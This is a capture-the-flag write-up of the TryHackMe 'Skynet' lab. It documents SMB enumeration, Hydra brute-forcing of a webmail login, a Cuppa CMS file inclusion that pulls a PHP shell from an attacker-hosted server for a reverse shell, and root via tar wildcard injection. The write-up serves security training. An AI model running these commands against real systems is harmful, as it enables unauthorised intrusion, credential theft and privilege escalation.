# Skynet — TryHackMe Writeup

- **Room theme:** Enumeration → webmail/CMS exploitation → cron privilege escalation
- **Target:** `10.48.143.97` (hostname: `skynet`)
- **Category:** SMB Enumeration / Password Attacks / Web Exploitation / Linux PrivEsc
- **Difficulty:** Easy

## TL;DR

Skynet exposes SSH, HTTP, POP3/IMAP, and SMB. Anonymous SMB access leaks a wordlist disguised as log files, which — rather than cracking SSH or SMB directly — turns out to be the password list for a SquirrelMail webmail login belonging to user `milesdyson`. From his mailbox and SMB share we pick up a hint pointing to a hidden Cuppa CMS install, which is vulnerable to a Remote File Inclusion bug that gets us a `www-data` shell. From there, a world-writable directory backed by a root cron job running `tar` gives us a classic tar wildcard injection privilege escalation to root.

## Recon

```bash
nmap -sV -sS -T4 -p- 10.48.143.97
nmap -p22,80,110,139,143,445 -T4 -sC 10.48.143.97
```

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH 7.2p2, Ubuntu) | Not viable without valid creds |
| 80   | Apache 2.4.18 (Ubuntu) | Hosts "Skynet" site + SquirrelMail; Apache version is theoretically CVE-2019-0211-vulnerable (local privesc, not used here) |
| 110/143 | Dovecot POP3/IMAP | Confirms a mailbox exists — worth keeping in mind for later |
| 139/445 | Samba 3.X–4.X | Guest/anonymous access allowed, message signing disabled |

`nikto` against port 80 flags SquirrelMail (version 1.4.23, vulnerable in principle to CVE-2017-5181) and confirms the Apache instance is outdated.

**SMB share enumeration:**
```bash
smbclient -L 10.48.143.97 -U anonymous
```
Shares found: `print$`, `anonymous` (Skynet Anonymous Share), `milesdyson` (Miles Dyson Personal Share), `IPC$`.

## Step 1 — Anonymous Share Leaks a "Password List"

```bash
smbclient //10.48.143.97/anonymous -N
```
Inside is `attention.txt` and a `logs/` folder containing `log1.txt` / `log2.txt` (identical contents) and an empty `log3.txt`. The two log files are actually a list of `terminator`-themed password candidates — clearly planted, not real application logs.

**What didn't work:** this list doesn't crack SSH or SMB creds for `milesdyson` directly via brute force.

**What worked:** the list is meant as a *web login* wordlist, not a network-service one.

## Step 2 — SquirrelMail Login via Hydra

```bash
hydra -l milesdyson -P log1.txt 10.48.143.97 http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
```

This authenticates as `milesdyson` against SquirrelMail using one of the harvested candidate passwords.

**Dead end tried next:** with webmail access established, we investigated whether **CVE-2017-7692** (a SquirrelMail command-injection RCE via crafted mail headers) could be leveraged for code execution. The mail transport on this box performs strict sender-address validation, so the exploit's injected flags were rejected with `501 5.1.7 Bad sender address syntax` — this path was a dead end.

## Step 3 — SMB Share Reused as a Pivot for the Real Credential

Rather than force the webmail RCE further, we went back to SMB: the account `milesdyson` also had a distinct SMB password (separate from the SquirrelMail one), obtained through earlier enumeration. Connecting with `smbclient` initially failed due to the password containing shell-special characters that Zsh was interpreting — quoting/escaping the password correctly resolved it.

```bash
smbclient //10.48.143.97/milesdyson -U milesdyson
```

The share root contains a mix of Machine Learning / Deep Learning study notes and a `notes/` directory. Inside `notes/`, `important.txt` stood out from the coursework filler:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

This is the actual pivot: a hidden path, `/45kra24zxs28v3yd/`, hosting an internal CMS that isn't linked anywhere on the public site.

## Step 4 — Cuppa CMS Discovery and RFI

Browsing to `http://10.48.143.97/45kra24zxs28v3yd/` reveals a **Cuppa CMS** installation. Cuppa CMS has a well-documented Remote File Inclusion vulnerability (published on Exploit-DB) in `alertConfigField.php`'s `urlConfig` parameter.

**Confirming the vuln / reading local config via PHP filter wrapper:**
```
http://10.48.143.97/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```
The response body is base64 — decoding it reveals the CMS's database configuration (including a password), confirming arbitrary local file read/inclusion.

**Escalating to code execution — remote file inclusion of a hosted shell:**
```
http://10.48.143.97/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.137.225:8000/shell.php
```
With a simple PHP web shell hosted on our attacking machine (`python3 -m http.server 8000`) and a listener ready first:
```bash
nc -nvlp 4444
```
the RFI parameter pulls and executes our hosted shell, and the reverse shell connects back as `www-data`.

## Step 5 — Privilege Escalation via Cron + Tar Wildcard Injection

From the `www-data` shell:
```bash
cat /etc/crontab
```
A root cron job periodically runs `tar` against the contents of `/var/www/html` (a directory `www-data` can write into), e.g. something functionally equivalent to:
```bash
tar cf /some/backup.tar *
```
run from inside `/var/www/html`.

This is the classic **tar wildcard injection** pattern: because the wildcard `*` is expanded by the shell before `tar` sees it, we can drop specially-named files into that directory that `tar` interprets as command-line flags rather than filenames.

```bash
cd /var/www/html
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> shell.sh
chmod +x shell.sh

echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```
When root's cron job next runs `tar cf ... *` in that directory, `tar` picks up `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` as arguments and executes our script as root, giving us a SUID root bash (or a direct root reverse shell, depending on the payload used).

```bash
/tmp/rootbash -p
```
confirms root access.

## Full Command Reference

```bash
# Recon
nmap -sV -sS -T4 -p- 10.48.143.97
nmap -p22,80,110,139,143,445 -T4 -sC 10.48.143.97
nikto -h http://10.48.143.97/

# Anonymous SMB enum — grab planted wordlist
smbclient -L 10.48.143.97 -U anonymous
smbclient //10.48.143.97/anonymous -N
#   cd logs; get log1.txt; get log2.txt; get log3.txt

# Brute-force SquirrelMail with the leaked wordlist
hydra -l milesdyson -P log1.txt 10.48.143.97 http-post-form \
  "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"

# milesdyson's personal SMB share — find the hidden CMS path
smbclient //10.48.143.97/milesdyson -U milesdyson
#   cd notes; get important.txt

# Cuppa CMS RFI — confirm arbitrary file read
curl "http://10.48.143.97/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php" | base64 -d

# Host a PHP shell and a listener, then trigger RFI
python3 -m http.server 8000
nc -nvlp 4444
# browser/curl:
# http://10.48.143.97/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker-ip>:8000/shell.php

# Root via cron + tar wildcard injection
cat /etc/crontab
cd /var/www/html
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
# wait for cron, then:
/tmp/rootbash -p
```

## Dead Ends Worth Recording

- **CVE-2017-7692 (SquirrelMail command injection via mail headers):** looked promising once webmail access was gained, but the mail transport's strict sender-address syntax validation rejected the crafted flags (`501 5.1.7`). Worth trying early on any mail-handling app, but not every mail transport will accept malformed envelope data — don't assume it'll work just because the CVE is applicable to the software version.
- **Apache 2.4.18 / CVE-2019-0211:** flagged by version banner as a theoretical local privesc route, but a much simpler and more reliable path (cron + tar wildcard) was available once we had a shell, so this was never pursued.
- **Treating the anonymous-share wordlist as a network-auth wordlist:** brute-forcing SSH/SMB directly with it doesn't pan out — the list's actual purpose only becomes clear once you notice a *web login form* (SquirrelMail) is in scope.

## Key Takeaways

1. **Anonymous/guest SMB access is often the real starting point**, even on boxes that also expose SSH and a web app — always check for guest shares before brute-forcing anything.
2. **Not every "log file" is a log file.** A wordlist hidden in a share masquerading as application logs is a common CTF pattern, and its real target (which service/login form) may not be obvious until later recon.
3. **A single user can have different passwords for different services** (SMB vs. webmail here) — don't assume a cracked credential is universal; keep enumerating per-service.
4. **Hidden/obscured admin paths are still discoverable through leaked notes**, not just brute-forcing directories — a to-do note in a personal file share was the actual disclosure vector for the Cuppa CMS path.
5. **RFI vulnerabilities are a two-step tool:** first use them for local file disclosure (via `php://filter`) to harvest configuration/secrets, then escalate to remote code execution by pointing the same parameter at attacker-hosted code.
6. **World-writable directories touched by a root cron job are a privesc goldmine.** If `tar`, `chmod`, `chown`, or similar GNU tools are invoked with unsanitized wildcards from a directory you can write to, checkpoint/exec-style argument injection is a reliable path to root — always check `/etc/crontab` and `crontab -l` equivalents after landing a low-priv shell.
7. **Failed exploits are still informative.** The SquirrelMail RCE attempt narrowed down that mail-transport validation was solid, which redirected effort toward the CMS path faster than blindly trying more exploits against the mail service.